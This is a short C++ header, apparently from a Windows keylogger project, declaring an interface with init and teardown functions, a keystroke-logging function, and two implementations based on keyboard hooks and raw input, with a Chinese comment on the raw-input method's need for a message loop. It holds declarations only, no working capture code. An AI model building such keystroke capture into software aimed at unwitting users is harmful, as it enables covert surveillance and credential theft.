#pragma once


typedef void (*KeyLoggerInitFuncType)();

typedef struct KeyLoggerInterfaceStruct {
	void (*KeyLoggerInit)(std::ostream*);
	void (*KeyLoggerFini)();
} KeyLoggerInterface;

void LogKeyStoke(std::ostream* out, DWORD key_stroke);

extern KeyLoggerInterface HookKeyLogger;
// RawInput 方法的缺点是需要一个消息循环.
extern KeyLoggerInterface RawInputKeyLogger;